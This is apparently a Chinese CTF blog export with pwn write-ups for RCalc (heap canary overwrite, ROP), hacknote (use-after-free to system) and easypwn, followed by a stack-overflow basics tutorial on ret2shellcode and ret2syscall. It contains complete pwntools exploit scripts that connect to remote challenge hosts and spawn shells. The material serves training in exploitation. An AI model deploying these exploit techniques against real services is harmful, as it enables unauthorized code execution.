<p>程序开始，申请了两个堆，且没有free，结合之后的代码可以知道，一个是0x100的存储数据的堆，一个是0x320的存储自定义的canary的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png" alt="image-20201223093330611"></p>
<p>向canary中写入随机数，和读取canary中的值，</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093513368.png" alt="image-20201223093513368"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093614793.png" alt="image-20201223093614793"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093659464.png" alt="image-20201223093659464"></p>
<p>与canary的值不一样说明有溢出，报错。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093802866.png" alt="image-20201223093802866">这里没有限制输入，是可以做到栈溢出的。</p>
<p>没有对堆上的存储做限制。是可以不断存储数据覆盖canary的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094116027.png" alt="image-20201223094116027"></p>
<h3 id="思路及分析"><a href="#思路及分析" class="headerlink" title="思路及分析"></a>思路及分析</h3><p>这道题实际上的思路和常规的有canary的栈溢出题目一样，覆盖或是泄露canary值然后就是常规的栈溢出、rop攻击。</p>
<p>不同的是这里的canary是自定义的，在一个堆中。但是上述分析可以看到，save和canary两个堆是连续申请的且没有free，也就是说这两个堆是连续的，而且并没有对向save堆写入数据有任何限制，是可以做到堆溢出的。</p>
<p>接下来就是计算需要save多少次数据才可以覆盖canary。动态调试，找到save和canary对应的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094827128.png" alt="image-20201223094827128"></p>
<p>之前差值为<code>（ 0x6033b0-0x6032a0）/8=34</code>，也就是说存储34次就能覆盖掉canary。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcanary</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;input 2 integer: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Save the result? &#x27;</span>, <span class="string">&#x27;yes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就能将canary覆盖为0，接下来就是栈溢出rop的常规操作。</p>
<p>先泄露地址，得到基地址，找到system。需要一个传参用的gadget，<code>pop rdi ，ret</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223095301158.png" alt="image-20201223095301158"></p>
<p>编写exp：</p>
<p><strong>需要注意的是，libc版本问题</strong>，如果出现如图的情况说明版本不对，地址对不上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223112047972.png" alt="image-20201223112047972"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">&quot;./RCalc&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">44237</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400850</span></span><br><span class="line">__libc_start_main_ = <span class="number">0x601FF0</span></span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000401123</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401036</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_canary</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>+k):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;input 2 integer: &quot;</span>)</span><br><span class="line">        io.send(<span class="string">&quot;0\n0\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Save the result? &quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">        <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload+=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(__libc_start_main_)</span><br><span class="line">    payload+=p64(puts_plt)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    libc_start_main_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    libc_addr_base=libc_start_main_addr-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;libc_start_main_addr &quot;</span>+<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">    log.success(<span class="string">&quot;libc_addr_base &quot;</span>+<span class="built_in">hex</span>(libc_addr_base))</span><br><span class="line"></span><br><span class="line">    system_addr=libc_addr_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr=libc_addr_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x110</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rdi_ret)</span><br><span class="line">    payload+=p64(bin_sh_addr)</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your name pls: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    pass_canary(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png" alt="image-20201223111914992"></p>
<h2 id="22-Aul"><a href="#22-Aul" class="headerlink" title="22.Aul"></a>22.Aul</h2><h2 id="23"><a href="#23" class="headerlink" title="23."></a>23.</h2><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png" alt="image-20201201211551807"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
<h3 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
<p>删除堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
<p>输出堆的内容：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
<p>添加堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
<p>自定义的输出函数</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数（也就是自定义的put函数），ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
<p>用图来说明关系：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
<h3 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里就需要先将chunk2释放。但是进入fastbin的chunk仍是之前的两个，所以和之前一样，再次申请的chunk仍可以修改control_chunk1。</p>
<p>这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
<p>图片演示过程：</p>
<ul>
<li>申请两个chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
<ul>
<li>依次删除0、1后再申请0x8的chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png" alt="image-20201201225035214"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png" alt="image-20201209094754572"></p>
<p>RELRO部分开启，可以改写GOT表。</p>
<h3 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png" alt="image-20201209095323845"></p>
<p>可以看到，read的范围很大，但是没法溢出栈底。</p>
<blockquote>
<p><strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</p>
</blockquote>
<p>因此，通过snprintf可以将v2溢出覆盖v3。</p>
<h3 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h3><blockquote>
<p>通过实验发现，程序应该是使用的libc-2.23，需在相应环境下进行调试。</p>
</blockquote>
<p>v3是格式化字符串，上述分析知道可以将v3改写。利用格式化字符串做到任意地址读写。</p>
<p>这里涉及到snprintf函数的原理。</p>
<blockquote>
<p>snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。</p>
</blockquote>
<p>这里地址没有改变，只是地址指向的内容变了。因此，v3改变了，整个格式化字符串就跟着变了。而不是先传入“%s”，snprintf函数就执行“%s”。</p>
<p>有了格式化字符串之后，就考虑如何得到shell。</p>
<p>目前已知，能够改写got表，能够任意地址写。很自然的想到改写某个函数的got为system。同时如之前的‘’greeting-150”，需要考虑到传参问题。</p>
<p>选择free函数的got改为system的plt，在“Input Your Name:”中输入“/bin/sh”。这样执行free（buf），就能得到shell。</p>
<p>整个程序没有使用system，需要先泄露地址。</p>
<p>分析在执行snprintf，且尚未对rsp进行调整时的栈情况：</p>
<p>输入为“aaaa”</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209104042184.png" alt="image-20201209104042184"></p>
<p>发现，可以泄露__libc_start_main+240的地址。</p>
<p>计算偏移：(0x7fffffffdfe8-0x7fffffffd380)/8=397</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出基础</title>
    <url>/posts/c68c5dc4/</url>
    <content><![CDATA[<h1 id="栈溢出基础总结"><a href="#栈溢出基础总结" class="headerlink" title="栈溢出基础总结"></a>栈溢出基础总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p>需要注意的是</p>
<p>函数调用过程中，调用函数的参数在其自身栈帧，即被调用函数的形参。被调用函数栈帧存放自身的局部变量，需要使用参数时，根据偏移向调用函数的栈帧中寻找。</p>
<a id="more"></a>

<p>动态调试一个简单的程序说明问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    x = fun(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了方便演示，使用gcc编译为32位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -g -o test #-g 生成调试信息，-ggdb为生成专属gdb的调试信息。</span><br></pre></td></tr></table></figure>



<p>可以看到，main函数的变量存在main的栈帧中。</p>
<p><img src="/posts/c68c5dc4/image-20201030201951676.png" alt="image-20201030201951676"></p>
<p>在调用的fun函数中，使用a，b时向main的栈帧访问。</p>
<p><img src="/posts/c68c5dc4/image-20201030202426288.png" alt="image-20201030202426288"></p>
<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX即No-eXecute（不可执行）的意思，NX enable意味着栈不可执行。</p>
<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>开启canary后的栈结构，其中canary不一定在rbp-8的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中rbp-0x8（通过这个汇编代码可以判断canary插入入位置） 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用栈溢出漏洞劫持执行流，让程序执行写入的shellcode。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+将shellcode放入可执行的段中</p>
<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><h4 id="pwntools的shellcode生成"><a href="#pwntools的shellcode生成" class="headerlink" title="pwntools的shellcode生成"></a>pwntools的shellcode生成</h4><p>利用pwntools的shellcraft模块可方便的生成shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#shellcraft.sh()是执行/bin/sh的shellcode。不使用设置的环境可改为shellcraft.amd64.linux.sh()</span></span><br><span class="line"><span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>根据攻击的目标机通过context设置环境变量</p>
<ul>
<li><strong><em>arch</em></strong>设置架构类型</li>
<li><strong><em>os</em></strong>设置操作系统</li>
<li><strong><em>log_level</em></strong>设置日志级别，常设为debug</li>
</ul>
<h4 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a><a href="https://www.exploit-db.com/">exploit-db</a></h4><p>pwntools可以生成一些简单、常规的shellcode。对于特殊要求的可以在exploit-db中查找。</p>
<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>ida反编译结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets函数明显的存在栈溢出。strncpy函数将输入复制给buf2.用ida可以看到buf2在bss段，大小为0x64.</p>
<p><img src="/posts/c68c5dc4/image-20201031111332809.png" alt="image-20201031111332809"></p>
<p>在gdb调试中使用vmmap，查看各段</p>
<p><img src="/posts/c68c5dc4/image-20201031111751831.png" alt="image-20201031111751831"></p>
<p>bss段有可执行权限。</p>
<p>exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>注意一点，这里ida显示的v4与ebp的偏移是0x64，实际上不准确。</p>
<p>在调试中，可以看到，v4相对esp的偏移是0x1c,esp为0xffffce00，所以v4为0xffffce1c。与ebp的偏移是0x6c。所以溢出到ret的数据一共是0x6c+4（112）。</p>
<p><img src="/posts/c68c5dc4/image-20201031113605999.png" alt="image-20201031113605999"></p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>直接使用系统调用来获得shell。即通过一系列的gadgets，将各个寄存器置为系统调用需要的参数，然后执行int 0x80即可。</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+足够的gadgets。在没法写入可执行的shellcode的时候考虑。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序。</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）。</li>
</ol>
<p>最常见的系统调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>寄存器的状态为</p>
<ul>
<li>eax为系统调用号，0xb</li>
<li>ebx为第一个参数，即指向字符串”/bin/sh”的地址</li>
<li>ecx、edx应为0</li>
</ul>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用ROPgadget来寻找所需要的gadgets。</p>
<p>关于ROPgadget的使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--memstr &lt;<span class="built_in">string</span>&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show <span class="keyword">this</span> help message <span class="keyword">and</span> <span class="built_in">exit</span></span><br><span class="line">  -v, --version         Display the ROPgadget<span class="number">&#x27;</span>s version</span><br><span class="line">  -c, --checkUpdate     Checks <span class="keyword">if</span> a <span class="keyword">new</span> version is available</span><br><span class="line">  --binary &lt;binary&gt;     Specify a binary filename to analyze</span><br><span class="line">  --opcode &lt;opcodes&gt;    Search opcode in executable segment</span><br><span class="line">  --<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;     Search <span class="built_in">string</span> in readable segment</span><br><span class="line">  --memstr &lt;<span class="built_in">string</span>&gt;     Search each byte in all readable segment</span><br><span class="line">  --depth &lt;nbyte&gt;       Depth <span class="keyword">for</span> search engine (<span class="keyword">default</span> <span class="number">10</span>)</span><br><span class="line">  --only &lt;key&gt;          Only show specific instructions</span><br><span class="line">  --filter &lt;key&gt;        Suppress specific mnemonics</span><br><span class="line">  --range &lt;start-end&gt;   Search between two addresses (<span class="number">0</span>x...<span class="number">-0</span>x...)</span><br><span class="line">  --badbytes &lt;byte&gt;     Rejects specific bytes in the gadget<span class="number">&#x27;</span>s address</span><br><span class="line">  --rawArch &lt;arch&gt;      Specify an arch <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawMode &lt;mode&gt;      Specify a mode <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawEndian &lt;endian&gt;  Specify an endianness <span class="keyword">for</span> a raw file</span><br><span class="line">  --re &lt;re&gt;             Regular expression</span><br><span class="line">  --offset &lt;hexaddr&gt;    Specify an offset <span 